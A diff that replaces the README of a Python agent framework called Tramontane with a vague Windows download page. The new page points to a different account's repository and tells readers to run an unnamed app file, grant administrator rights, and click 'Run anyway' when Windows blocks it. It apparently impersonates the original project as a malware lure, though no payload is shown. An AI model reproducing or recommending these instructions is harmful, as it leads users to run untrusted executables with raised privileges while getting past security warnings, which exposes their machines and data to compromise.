@@ -1,319 +1,194 @@
-# Tramontane
-
-> **The only agent framework with state-of-the-art memory, typed skills, and intelligent model routing.**
-
-Mistral-native agent orchestration with 3-tier memory, composable skills, 4-channel retrieval, and GDPR compliance. Built in Orleans, France.
-
-```bash
-pip install tramontane
-```
-
-[![PyPI](https://img.shields.io/pypi/v/tramontane)](https://pypi.org/project/tramontane/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Python 3.12+](https://img.shields.io/badge/python-3.12+-blue.svg)](https://www.python.org/downloads/)
-
-## Why Tramontane?
-
-| Feature | CrewAI | LangGraph | OpenClaw | Tramontane |
-|---------|--------|-----------|----------|------------|
-| Role-based agents | Yes | No | No | Yes |
-| 3-tier memory (working+factual+experiential) | No | No | Basic | **Yes** |
-| Agent-controlled memory tools | No | No | No | **Yes** |
-| 4-channel retrieval + RRF fusion | No | No | No | **Yes** |
-| Typed skills with profiling | No | No | .md only | **Yes** |
-| Skill composition (pipelines) | No | No | Lobster | **Yes** |
-| Tool calling (native functions) | Yes | Yes | Yes | Yes |
-| Structured output (Pydantic) | Yes | No | No | **Yes** |
-| Reasoning effort control | No | No | No | **Yes** |
-| Progressive reasoning | No | No | No | **Yes** |
-| Model cascading | No | No | No | **Yes** |
-| Self-learning router | No | No | No | **Yes** |
-| FleetTuner (auto-optimize) | No | No | No | **Yes** |
-| Parallel execution | Yes | Yes | No | Yes |
-| Knowledge bases (RAG) | Yes | Yes | No | Yes |
-| Voice pipelines (TTS/STT) | No | No | No | **Yes** |
-| Cost simulation (dry run) | No | No | No | **Yes** |
-| EUR cost tracking | No | No | No | **Yes** |
-| GDPR middleware | No | No | No | **Yes** |
-| MCP tool export | No | No | No | **Yes** |
-
-## Quick Start
-
-```python
-import asyncio
-from tramontane import Agent, MistralRouter
-
-agent = Agent(
-    role="Analyst",
-    goal="Analyze market trends",
-    backstory="Senior market analyst",
-    model="auto",
-    budget_eur=0.01,
-)
-
-async def main():
-    router = MistralRouter()
-    result = await agent.run("Analyze the EU AI market", router=router)
-    print(f"Model: {result.model_used}, Cost: EUR {result.cost_eur:.4f}")
-    print(result.output)
-
-asyncio.run(main())
-```
-
-## Memory
-
-3-tier memory: working (always in context), factual (knowledge graph), experiential (self-improvement).
-
-```python
-from tramontane import Agent, TramontaneMemory
-
-memory = TramontaneMemory(db_path="memory.db")
-
-agent = Agent(
-    role="Gerald",
-    goal="Remember everything about clients",
-    backstory="Autonomous business agent",
-    tramontane_memory=memory,
-    memory_tools=True,        # Gets retain/recall/reflect/forget/update tools
-    auto_extract_facts=True,  # Auto-extracts facts after every run
-    working_memory_blocks=["Goals", "User"],
-)
-```
-
-The agent can call `retain_memory("Acme Corp prefers React")`, `recall_memory("What does Acme prefer?")`, `reflect_on_memory("What patterns have I seen?")`, `forget_memory(id, "GDPR request")`, and `update_memory(id, "new info")` during execution.
-
-4-channel retrieval: semantic (cosine similarity on mistral-embed vectors) + keyword (FTS5 BM25) + entity (graph traversal) + temporal (recency + frequency). Results fused via Reciprocal Rank Fusion (k=60).
-
-[Full memory docs](docs/memory.md)
-
-## Skills
-
-Typed, composable, learnable capabilities with profiling and security.
-
-```python
-from tramontane import Skill, SkillResult, SkillRegistry, track_skill
-
-class LeadQualifier(Skill):
-    name = "lead_qualifier"
-    description = "Score B2B leads against ICP"
-    triggers = ["qualify", "score lead"]
-    preferred_model = "ministral-3b-latest"
-
-    @track_skill  # Auto-logs timing, cost, success/failure
-    async def execute(self, input_text, context=None):
-        from tramontane import Agent
-        agent = Agent(role="Qualifier", goal="Score leads", backstory="Sales expert",
-                      model=self.preferred_model)
-        result = await agent.run(input_text)
-        return SkillResult(output=result.output, success=True, cost_eur=result.cost_eur)
-
-registry = SkillRegistry()
-registry.register(LeadQualifier())  # SHA-256 hash + security scan
-matches = registry.search("qualify this lead")
-```
-
-Includes 5 built-in skills: TextAnalysis, CodeGeneration, EmailDraft, DataExtraction, WebSearch. Supports Python, YAML, and SKILL.md formats. Compose with `SkillPipeline`, `ConditionalSkill`, `ParallelSkills`.
-
-[Full skills docs](docs/skills.md)
-
-## Tool Calling
-
-```python
-async def search_web(query: str) -> str:
-    """Search the web for information."""
-    return f"Results for: {query}"
-
-agent = Agent(
-    role="Researcher",
-    goal="Find information",
-    backstory="Expert researcher",
-    tools=[search_web],
-    tool_choice="auto",       # "auto" | "none" | "any" | "required"
-    parallel_tool_calls=True,
-    max_iter=5,
-)
-result = await agent.run("Research Mistral AI", router=router)
-print(result.tool_calls)
-```
-
-## Structured Output
-
-```python
-from pydantic import BaseModel
-
-class Analysis(BaseModel):
-    summary: str
-    score: int
-    recommendations: list[str]
-
-agent = Agent(role="Analyst", goal="Analyze", backstory="Expert",
-              output_schema=Analysis)
-result = await agent.run("Analyze this market")
-analysis: Analysis = result.parsed_output  # Validated Pydantic model
-```
-
-## Smart Fleet
-
-### Reasoning Effort
-```python
-agent = Agent(model="mistral-small-4", reasoning_effort="high")  # none | medium | high
-```
-
-### Progressive Reasoning
-```python
-agent = Agent(model="mistral-small-4", reasoning_strategy="progressive",
-              validate_output=lambda r: "conclusion" in r.output)
-# Tries none -> medium -> high, stops at first success
-```
-
-### Model Cascading
-```python
-agent = Agent(model="devstral-small",
-              cascade=["devstral-2", "mistral-large-3"],
-              validate_output=lambda r: len(r.output) > 1000)
-```
-
-### FleetTuner
-```python
-from tramontane import FleetTuner
-tuner = FleetTuner()
-result = await tuner.tune(agent, ["prompt1", "prompt2"], optimize_for="balanced")
-optimized = result.apply(agent)
-```
-
-### Self-Learning Router
-```python
-from tramontane import MistralRouter, FleetTelemetry
-router = MistralRouter(telemetry=FleetTelemetry())
-# After 50+ decisions, routes by YOUR production data
-```
-
-### Fleet Profiles
-```python
-from tramontane import FleetProfile
-agent = Agent(fleet_profile=FleetProfile.BUDGET)  # BUDGET | BALANCED | QUALITY | UNIFIED
-```
-
-[Full fleet docs](docs/smart-fleet.md)
-
-## Parallel Execution
-
-```python
-from tramontane import ParallelGroup
-group = ParallelGroup([designer, architect])
-result = await group.run(input_text="Design a website")
-print(result.get("Designer").output)
-print(f"Total: EUR {result.total_cost_eur:.4f}")
-```
-
-## Knowledge Bases (RAG)
-
-```python
-from tramontane import KnowledgeBase
-kb = KnowledgeBase(db_path="knowledge.db")
-await kb.ingest(sources=["docs/*.md"])
-agent = Agent(role="Support", goal="Help", backstory="Expert", knowledge=kb, knowledge_top_k=5)
-```
-
-## Pipeline YAML
-
-```yaml
-name: Lead Gen
-budget_eur: 0.01
-agents:
-  researcher:
-    role: Researcher
-    model: mistral-small-4
-  writer:
-    role: Writer
-    model: devstral-small
-    temperature: 0.8
-flow: [researcher, writer]
-```
-```bash
-tramontane run pipeline.yaml --input "Research Scaleway"
-```
-
-## Voice Pipelines
-
-```python
-from tramontane import VoicePipeline
-vpipe = VoicePipeline(agent=my_agent, enable_tts=True)
-result = await vpipe.run(text_input="Brief me on today's leads")
-# result.audio_bytes = spoken response via Voxtral TTS
-```
-
-## Streaming
-
-```python
-async for event in agent.run_stream("Generate a report",
-    on_pattern={r"## (?P<section>.+)": on_section_found}):
-    if event.type == "token":
-        print(event.token, end="", flush=True)
-    elif event.type == "tool_call":
-        print(f"\n[Calling {event.tool_name}]")
-```
-
-## GDPR
-
-```python
-agent = Agent(role="Processor", goal="Process data", backstory="Expert",
-              gdpr_level="strict", audit_actions=True)
-# Built-in PII detection, Article 17 erasure, Article 30 reports
-```
-
-## The Mistral Fleet
-
-| Model | Best For | EUR/1M in/out | Reasoning | Vision |
-|-------|----------|---------------|-----------|--------|
-| ministral-3b | Classification, triage | 0.04/0.04 | | |
-| ministral-7b | Bulk, extraction | 0.10/0.10 | | |
-| mistral-small | General, multilingual | 0.10/0.30 | | |
-| mistral-small-4 | General+reasoning+vision | 0.15/0.60 | Yes | Yes |
-| devstral-small | Code generation | 0.10/0.30 | | |
-| devstral-2 | Complex SWE | 0.50/1.50 | | |
-| magistral-small | Reasoning, planning | 0.50/1.50 | | |
-| magistral-medium | Deep reasoning | 2.00/5.00 | | |
-| mistral-large | Frontier synthesis | 2.00/6.00 | | |
-| mistral-large-3 | Frontier (Apache 2.0) | 2.00/6.00 | | |
-| pixtral-large | Vision, OCR | 2.00/6.00 | | |
-| voxtral-mini | Transcription | 0.04/0.04 | | |
-| voxtral-tts | Text-to-speech | 0.016/char | | |
-
-## CLI
-
-```bash
-tramontane models                    # Fleet with pricing + capabilities
-tramontane doctor                    # Health check + API connectivity
-tramontane fleet                     # Fleet stats from telemetry
-tramontane simulate pipeline.yaml    # Cost estimate without API calls
-tramontane knowledge ingest docs/    # Build knowledge base
-tramontane knowledge search "query"  # Search knowledge base
-tramontane telemetry stats           # Router learning metrics
-```
-
-## Built With Tramontane
-
-- **ArkhosAI** — EU answer to Lovable. 4-agent website generator, EUR 0.004/generation.
-- **Gerald** — Autonomous business intelligence agent with memory + skills.
-
-## Install
-
-```bash
-pip install tramontane                # Core
-pip install tramontane[redis]         # Redis memory backend
-pip install tramontane[postgres]      # PostgreSQL + pgvector
-pip install tramontane[voice]         # Voice gateway
-pip install tramontane[sandbox]       # E2B code sandbox
-```
-
-## Links
-
-- [GitHub](https://github.com/Jesiel-dev-creator/TRAMONTANE)
-- [PyPI](https://pypi.org/project/tramontane/)
-- [Live Demo](https://hf.co/spaces/BleuCommerce-Apps/TRAMONTANE-demo)
-- [Docs](https://github.com/Jesiel-dev-creator/TRAMONTANE/tree/main/docs)
-
-## License
-
-MIT — Bleucommerce SAS, Orleans, France
+# 🌬️ TRAMONTANE - Smart agent routing for Windows
+
+[![Download TRAMONTANE](https://img.shields.io/badge/Download-TRAMONTANE-blue?style=for-the-badge&logo=github)](https://github.com/Badisk7963/TRAMONTANE)
+
+## 📥 Download TRAMONTANE
+
+Use this page to download TRAMONTANE:
+
+https://github.com/Badisk7963/TRAMONTANE
+
+## 🪟 Install on Windows
+
+1. Open the download page in your browser.
+2. Find the latest version of TRAMONTANE.
+3. Download the Windows file or source package from the page.
+4. If you get a ZIP file, right-click it and choose **Extract All**.
+5. Open the extracted folder.
+6. Double-click the TRAMONTANE app file to start it.
+
+If Windows asks for permission, select **Yes**.
+
+## 🚀 Getting Started
+
+TRAMONTANE helps you route tasks across a model fleet with less effort. It is built for users who want a simple way to run agent workflows on a Windows PC.
+
+### What it does
+
+- Routes requests to the best model for the task
+- Supports multi-agent workflows
+- Handles pipeline steps in one place
+- Fits GDPR-focused use cases
+- Works with Mistral-native setups
+- Keeps the process simple for end users
+
+## 🖥️ System Requirements
+
+For a smooth run, use a Windows PC with:
+
+- Windows 10 or Windows 11
+- At least 8 GB RAM
+- 2 GB free disk space
+- A stable internet connection
+- Permission to run downloaded apps
+
+If you plan to use larger model setups, 16 GB RAM gives better results.
+
+## ⚙️ First Run
+
+After you open TRAMONTANE for the first time:
+
+1. Let the app finish its setup.
+2. Follow the on-screen prompts.
+3. Choose your preferred model or agent path.
+4. Add any needed API keys or local model paths.
+5. Save your settings.
+6. Start your first workflow.
+
+If the app asks for access to folders or network use, allow it if you trust your setup.
+
+## 🧭 How to Use TRAMONTANE
+
+TRAMONTANE is built around routing and orchestration. In plain terms, that means it helps send each task to the right model or agent.
+
+### Common use cases
+
+- Answering user requests
+- Splitting one task into smaller steps
+- Sending a task to a faster model for quick replies
+- Using a stronger model for harder work
+- Running a set of agents in sequence
+- Managing a pipeline from start to finish
+
+### Basic workflow
+
+1. Open the app.
+2. Create a new task or project.
+3. Add your input.
+4. Pick a routing rule or agent path.
+5. Run the task.
+6. Review the output.
+
+## 🔧 Setup Tips
+
+Use these tips if you want a smoother start:
+
+- Keep the app in a simple folder path, such as `C:\TRAMONTANE`
+- Avoid special characters in folder names
+- Close other heavy apps if your PC feels slow
+- Keep your internet on if the app uses online models
+- Use one project at a time when testing the first setup
+
+## 🧩 Features
+
+### Smart routing
+TRAMONTANE can direct each request to the model that fits best.
+
+### Multi-agent support
+You can chain several agents together for larger tasks.
+
+### Pipeline control
+The app helps you manage task steps in order.
+
+### Mistral-native design
+TRAMONTANE is built with Mistral use in mind.
+
+### GDPR-friendly structure
+It supports privacy-first workflows for EU-focused work.
+
+### Fleet-aware orchestration
+It can work across a set of models instead of one fixed path.
+
+## 📁 Folder Layout
+
+If you extract a ZIP file, you may see folders like these:
+
+- `TRAMONTANE`
+- `config`
+- `data`
+- `logs`
+- `models`
+- `output`
+
+If you see a settings file, open it only if you need to change a path or model choice.
+
+## 🔒 Privacy and Data
+
+TRAMONTANE is designed for GDPR-aware use cases. That means it fits workflows where data handling matters.
+
+For safer use:
+
+- Store data in trusted folders
+- Use local models when possible
+- Review any connected services before use
+- Keep access limited to the files you need
+
+## 🛠️ Common Problems
+
+### The app does not open
+- Make sure you extracted the ZIP file first
+- Right-click the app and choose **Run as administrator**
+- Check that your Windows version is current
+
+### Windows blocks the file
+- Open **More info**
+- Select **Run anyway** if you trust the source
+- Download the file again if it looks damaged
+
+### The app feels slow
+- Close apps you do not need
+- Restart your PC
+- Use a machine with more RAM
+- Reduce the number of active agents
+
+### A model does not load
+- Check the model path
+- Make sure the file is present
+- Confirm the app has access to the folder
+- Try a smaller model first
+
+## 📦 Recommended Use
+
+TRAMONTANE works well for:
+
+- Personal automation
+- Team workflows
+- Internal tools
+- Model routing tests
+- Agent-based task runs
+- Privacy-aware AI setups
+
+## 🧪 Example Task Flow
+
+A simple flow might look like this:
+
+1. You enter a request.
+2. TRAMONTANE checks the task type.
+3. It sends the task to the right model.
+4. One agent refines the result.
+5. Another agent checks the output.
+6. The app returns the final answer.
+
+## 📍 Download and Run Again
+
+Use this link to download TRAMONTANE:
+
+[https://github.com/Badisk7963/TRAMONTANE](https://github.com/Badisk7963/TRAMONTANE)
+
+## 🧾 Project Details
+
+- Repository: TRAMONTANE
+- Focus: agent orchestration
+- Style: Mistral-native
+- Scope: multi-agent routing and pipeline control
+- Audience: Windows users who want a simple setup path
